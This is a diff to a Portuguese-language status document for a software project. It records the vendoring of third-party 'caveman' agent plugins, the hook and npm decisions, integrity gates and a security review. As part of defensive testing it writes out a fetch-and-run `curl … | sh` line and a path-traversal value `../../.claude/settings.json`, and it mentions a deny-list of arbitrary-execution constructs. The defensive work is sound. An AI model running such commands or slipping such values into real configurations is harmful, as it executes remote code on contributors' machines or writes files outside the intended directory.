@@ -1,7 +1,9 @@
 # SparkForge AWS — estado por fase
 
-**Atualizado em:** 2026-08-05
-**Commit de referência:** fechamento da branch `feat/preservacao-semantica`
+**Atualizado em:** 2026-08-07
+**Commit de referência:** vendorização do ecossistema caveman (ferramental de
+agente; nenhuma regra, extrator ou fact mudou). Fechamento anterior: branch
+`feat/preservacao-semantica`, 2026-08-05
 **Versão do pacote:** `0.5.0` — consistente em `pyproject.toml`, `manifest.json`,
 `.claude-plugin/plugin.json` e `sparkforge.__version__`. A concordância entre as
 quatro é verificada por
@@ -29,7 +31,7 @@ arquivo ganha.
 
 | Dimensão | Valor | Onde conferir |
 |---|---|---|
-| Testes | **4723** passando, 5 skipped | `python -m pytest -q` |
+| Testes | **4765** passando, 5 skipped | `python -m pytest -q` |
 | Regras do `AGENT_PROTOCOL.md` | **10** | `AGENT_PROTOCOL.md`, seção *Regras* |
 | Regras com eixo de resultado no `validation` | **62 de 81** — as 19 restantes são segredo, log, capacidade, detecção de runtime e metodologia | `tests/test_rules_result_axis.py` |
 | Regras com `runtime_scope` não-vazio | **9 de 81** — 8 guardadas por `glue`, 1 por faixa de Spark (`SF-GRAPH-002`) | `load_catalog()` |
@@ -51,6 +53,8 @@ arquivo ganha.
 | Ramos de severidade com golden que os produz | **89 de 89** (15 deles nas 7 regras com `severity_by`; `SF-GRAPH` não tem nenhuma, ver `V-GR-3`) | `tests/test_fixtures_kind_coverage.py::test_every_severity_branch_has_a_golden_that_produces_it` |
 | Fontes oficiais vigiadas | **131** (123 móveis, 8 fixas) — 61 citadas por regra, 126 por `knowledge/`, 56 pelas duas | `knowledge/sources.lock.json` |
 | Pares de eval | 10 | `evals/fase0.xml` |
+| Arquivos de terceiro vendorizados | **127**, em 2 projetos MIT | `python scripts/vendor_caveman.py --check` |
+| Plugins de agente ligados por padrão | **2** (`caveman`, `ck`), do marketplace local `sparkforge-caveman` | `.claude/settings.json` |
 
 Regras por área: SF-PY 12, SF-EMR 9, SF-EMRS 6, SF-GLUE 6, SF-UI 6, SF-ATH 5,
 SF-ENV 5, SF-FVAL 5, SF-ICE 5, SF-PQ 5, SF-BENCH 4, SF-DQ 4, SF-GRAPH 4,
@@ -1946,6 +1950,192 @@ O erro caro seria apresentar as três camadas com a mesma cara.
     à linha do EMR Serverless até a semana passada: enfileirar é decisão de
     roadmap, e o inventário registra a ausência em vez de fingir uma posição
 13. **Trilha paralela** — mecanismo de recomendação com garantia declarada, quando a base de restrições estiver maior. As frentes sem artefato da especialização em bancos — escolha de banco, modelagem de grafo, boas práticas genéricas — entram por aqui, e até lá viram restrição auditável em `knowledge/`
+
+## Ferramental de agente — ecossistema caveman vendorizado (2026-08-07)
+
+Não é fase do analisador: nenhuma regra, nenhum extrator e nenhum fact mudaram.
+É **infraestrutura de sessão** — o que o repositório gasta em token para operar
+os agentes que já tinha.
+
+**Critério de entrada, fixado depois de duas rodadas:** clonar é a instalação
+inteira. Não há `package.json` no repositório, nenhum caminho padrão chama `npm`
+ou `npx`, e nada aqui vai à rede. Peça que não cabe nisso fica **fora**, com a
+razão registrada.
+
+| Peça | Autor | Como chega | Estado |
+|---|---|---|---|
+| `caveman` | Julius Brussee, MIT | `vendor/caveman/`, pinado em `ec83e5ba` | Plugin do marketplace local `sparkforge-caveman`. **Ligado, zero instalação** |
+| `cavekit` (`ck`) | Julius Brussee, MIT | `vendor/cavekit/`, pinado em `c322f0bb` | Mesmo marketplace. **Ligado, zero instalação** |
+| `caveman-shrink` | Julius Brussee, MIT | `vendor/caveman/src/mcp-servers/`, sem dependência | **Em disco, desligado** — medido em 0,1 % neste catálogo |
+| `cavemem` | Julius Brussee, MIT | — | **Fora**: npm + módulo nativo, e não economiza token |
+| `caveman-code` | Julius Brussee, MIT | — | **Fora**: npm + módulo nativo, e roda fora do Claude Code |
+
+**Por que marketplace local e não `.claude/skills/`.** Aquele diretório é
+espelho gerado de `skills/`, e `scripts/sync_skills.py --check` acusa **órfão em
+qualquer profundidade** — skill de terceiro colocada ali quebraria o gate na
+primeira execução, e `sync_skills.py` (modo default) a apagaria. `vendor/` como
+marketplace `directory` mantém o layout do upstream intacto, não toca espelho
+nenhum, e carrega skills, subagentes, comandos e hooks pela porta que o Claude
+Code já tem para isso.
+
+**As duas lacunas do "clonar e usar", e como cada uma fechou.** A primeira
+rodada entregou plugin vendorizado e ativação declarada, e ainda assim o alvo —
+*não instalar nada além do repositório* — não estava atingido:
+
+1. **Node.** Os dois hooks do plugin caveman são `node ...`. Sem Node eles não
+   rodam, as skills continuam carregando, e "ligado por padrão" vira "ligado
+   quando alguém digitar `/caveman`" — sem nada acusar. Fechada com um hook de
+   `SessionStart` em shell puro, guardado por `command -v node`: com Node é
+   no-op (sem injeção dupla), sem Node imprime o ruleset de
+   `vendor/caveman/src/rules/caveman-activate.md`. Perde-se só o flag de modo e
+   o `/caveman-stats`, que são do hook em JS.
+2. **`npm`.** Fechada por **remoção**, não por conveniência. A rodada anterior
+   tentou um bootstrap opt-in que disparava `npm ci` sozinho; a decisão final
+   foi tirar `cavemem` e `caveman-code` do repositório. `package.json`,
+   `package-lock.json`, os cinco hooks do cavemem, o servidor MCP dele e o
+   wrapper `scripts/hooks/` foram apagados. O invariante virou gate:
+   `tests/test_vendor_caveman.py::TestSemNpm` falha se aparecer `package.json`
+   na raiz, ou `npm`/`npx`/`node_modules` em qualquer comando de hook ou
+   servidor MCP — **inclusive no `plugin.json` do projeto de terceiro**, que
+   pode mudar num bump futuro.
+
+**Por que remover em vez de manter opcional.** `cavemem` não economiza token:
+o `SessionStart` dele *injeta* contexto da sessão anterior — medido em ~2 k tokens
+numa sessão de teste. É memória, e memória durável neste projeto já tem dono:
+`.sparkforge/case.yaml`, commitado, que é o único registro que um `Finding` pode
+citar. `caveman-code` é um cliente de terminal alternativo, roda fora do Claude
+Code e não participa da economia daqui. Nenhum dos dois pagava o custo de pôr
+npm, registry e compilação nativa no caminho de quem clona.
+
+**`caveman-shrink`: vendorizado, medido, desligado.** Proxy MCP do mesmo autor,
+**sem dependência nenhuma**, que comprime o campo `description` do catálogo de
+tools. Medido contra os 41 tools do `sparkforge` em 2026-08-07:
+**146 438 → 146 295 bytes, 0,1 %**. As regras cortam artigo e filler **em
+inglês**; as descrições deste catálogo são em português. Nomes e `inputSchema`
+saem idênticos — o proxy está correto, só não tem o que cortar. Fica em disco
+com a medição registrada em `vendor/CREDITS.md` e um teste que garante as duas
+metades: continua disponível, e nada o põe no caminho do MCP sem medição nova.
+
+**Dois defeitos, encontrados e depois descartados junto com o código.** Ao
+exercitar o bootstrap apareceram `spawn('npm.cmd', …)` levantando **EINVAL**
+desde a correção do CVE-2024-27980 (Node 18.20 / 20.12) — escondido atrás de um
+lock gravado antes do spawn — e `process.stdout.write` seguido de `process.exit`
+**perdendo a linha** com stdout em pipe, que é como o Claude Code chama o hook.
+Ambos foram corrigidos e o código todo saiu na decisão acima. Ficam registrados
+porque a lição sobrevive ao código: **caminho de hook não exercitado é caminho
+não testado**, e os dois só apareceram ao rodar, nunca ao ler.
+
+**Modo `full` fixado no repositório.** `.caveman/config.json` é o *repo-local
+config* que o caveman resolve antes da configuração de usuário e depois só da
+variável de ambiente. Fixa o modo para quem clonar sem alterar a configuração
+global de ninguém.
+
+**As cópias upstream ficam desligadas dentro do projeto.** `.claude/settings.json`
+declara `caveman@caveman: false` e `ck@cavekit: false`. Dois caveman ligados
+injetam o ruleset duas vezes por sessão — ativar em dobro custa o token que a
+peça existe para cortar.
+
+**Agente sem plugin.** Devin, Copilot e Codex não carregam plugin nem hook. Para
+eles o ruleset está inline em `AGENTS.md`, com o recorte que este projeto impõe
+por cima: o schema `recommendation:`/`Finding` inteiro, números, versões,
+`rule_id`, `fact_id`, strings de erro e blocos de código são **verbatim**.
+Compressão que apaga campo de evidência é defeito, não economia.
+
+**O que impede o vendor de apodrecer.** `vendor/PINS.json` guarda repo, SHA,
+lista de arquivos mantidos e o patch local; `vendor/MANIFEST.sha256` guarda o
+sha256 de cada um dos 127 arquivos. `python scripts/vendor_caveman.py --check`
+é gate **sem rede** e roda em `tests/test_vendor_caveman.py`, com 29 testes que
+cobrem procedência, ativação e crédito. Um único patch declarado: o
+`caveman-compress` do upstream publica o `SKILL.md` em `skills/` e os scripts
+que ele executa só em `plugins/` — sem a cópia, a skill carrega e falha em uso.
+
+**A superfície de execução virou lista fechada.** Vendorizar código de terceiro
+que roda como hook criou uma superfície que o repositório não tinha: clonar e
+abrir o Claude Code passa a **executar código** antes de alguém digitar nada. O
+`MANIFEST.sha256` cobre os bytes de `vendor/`, mas não cobria o
+`.claude/settings.json`, que é nosso e commitado — um PR que acrescentasse um
+`curl | sh` ali executaria na máquina de todo contribuidor, e num diff grande
+passaria como linha de JSON.
+
+`tests/test_execution_surface.py` fecha isso com a **string exata** de cada
+comando em três superfícies (`.claude/settings.json`, o `plugin.json`
+vendorizado, os servidores de `.mcp.json`), mais um deny-list de construções de
+execução arbitrária como segunda camada. Allowlist de padrão foi recusada de
+propósito: `node .*` autorizaria `node -e "..."`.
+
+O gate foi verificado por mutação, não por leitura: injetar
+`curl -s https://… | sh` no `SessionStart` faz **3 dos 12 testes falharem** —
+o da lista fechada, o do deny-list e o de permissão morta.
+
+No mesmo passe, `.claude/settings.local.json` entrou no `.gitignore` do
+repositório. Ele estava protegido apenas pelo gitignore **global** de uma
+máquina; em qualquer outro clone um `git add -A` o commitaria — e o arquivo
+descreve o que aquele operador autorizou a rodar sem confirmação.
+
+**Auditoria do que foi vendorizado, 2026-08-07, no SHA pinado.** Comportamento
+observável dos hooks em JS: **zero** chamadas de rede; **um** `execFileSync`, em
+forma argv, sem shell — o argumento que vem do prompt (`--since`) entra como
+elemento separado do argv, sem caminho de injeção; escritas confinadas a
+`~/.claude/.caveman-*` e aos arquivos de agente do próprio plugin, e só quando
+`CAVECREW_*_MODEL` está no ambiente. `caveman-stats.js` **lê os transcripts de
+sessão** para calcular economia de token — leitura local, sem rede, mas é o
+conteúdo das conversas passando por código de terceiro, e isso fica registrado.
+O que **não** foi feito: leitura linha a linha dos ~226 KB de `src/`, e o Python
+de `caveman-compress/scripts/` segue fora do ruff (`exclude = ["fixtures",
+"vendor"]`) — ele só executa se alguém invocar `/caveman-compress`.
+
+**Revisão de segurança da própria rodada (2026-08-07).** Três candidatos
+levantados, cada um verificado por um revisor independente. Dois caíram:
+
+- *Injeção de argumento no `git`* — **falso positivo**. A alegação era que uma
+  URL `ext::<comando>` em `PINS.json` executaria no `fetch`. Errada: o git
+  classifica `ext` como transporte "scary" e o default de `protocol.ext.allow`
+  é **`never`** desde a série de hardening v2.11.1/v2.12. E o cenário assumia
+  CI verde, o que também é falso: `pytest` roda em todo PR e
+  `test_cada_projeto_declara_repo_sha_e_licenca` já rejeitava `repo` fora de
+  `https://github.com/` e `sha` fora de 40 hex.
+- *Gate de integridade insuficiente* — **falso positivo**. O caminho descrito
+  ("PR malicioso edita um arquivo vendorizado e a linha do manifest") tem o
+  mesmo privilégio de editar qualquer `.py` de `sparkforge/`. É a fronteira de
+  confiança inerente a vendorizar, não defeito novo.
+
+Um sobreviveu, e era **defeito real em código escrito nesta rodada**:
+
+**Path traversal em `scripts/vendor_caveman.py`.** `materialize()` fazia
+`dest / entry["keep"]` e `dest / patch["to"]` sem contenção, seguidos de
+`shutil.rmtree`/`copytree`. `Path("vendor") / "/etc/x"` devolve `/etc/x` — o
+operador `/` do pathlib **descarta** o lado esquerdo quando o direito é
+absoluto, e `..` nunca é normalizado. Um `to` de `../../.claude/settings.json`
+num PR de "bump de pin" escreveria fora de `vendor/`, e o CI não veria: ele só
+roda `--check`, que nunca lê os campos de caminho do `PINS.json`. Pior:
+`actual_manifest()` só varre `VENDOR.rglob`, então o arquivo escrito fora ficava
+**invisível para o único gate que o script existe para sustentar**.
+
+Era inconsistência, não decisão: `install_skills.py::install_dest` e
+`verify_wheel.py::_artifact_dest` já aplicavam exatamente essa guarda. Corrigido
+com `_confinado()` sobre `dest`, `keep`, `patches[].copy` e `patches[].to`, mais
+validação de `repo`/`sha` movida para dentro de `clone_at()` — teste não protege
+quem roda o script antes da suíte. Verificado por mutação de ponta a ponta: com
+o `PINS.json` envenenado, o script recusa com
+`` `patches[].to` = '../../.claude/settings.json' contem `..`. Recusado. `` e o
+`settings.json` fica intacto.
+
+No mesmo passe, a docstring do módulo foi corrigida: ela dizia que o manifest
+"amarra cada byte a um SHA upstream declarado". Não amarra — é regravado a
+partir do disco e commitado no mesmo tree. Agora diz o que o gate pega
+(divergência acidental) e o que não pega (commit deliberado, cujo controle é a
+revisão do diff).
+
+**Limites declarados.** Dois, e os dois são escolha, não pendência:
+
+- **Sem memória entre sessões.** `cavemem` está fora, pelas razões acima. O que
+  atravessa sessão continua sendo `.sparkforge/case.yaml`. Reverter significa
+  aceitar npm no caminho de quem clona — decisão de produto, não de código.
+- **`caveman-shrink` desligado.** Reavaliar só se o catálogo passar a ter
+  descrição em inglês. A medição de 2026-08-07 está registrada; reverter sem
+  medir de novo é adivinhar.
+
+Créditos e procedência completos: [`vendor/CREDITS.md`](../../vendor/CREDITS.md).
 
 ## Dívidas abertas
 
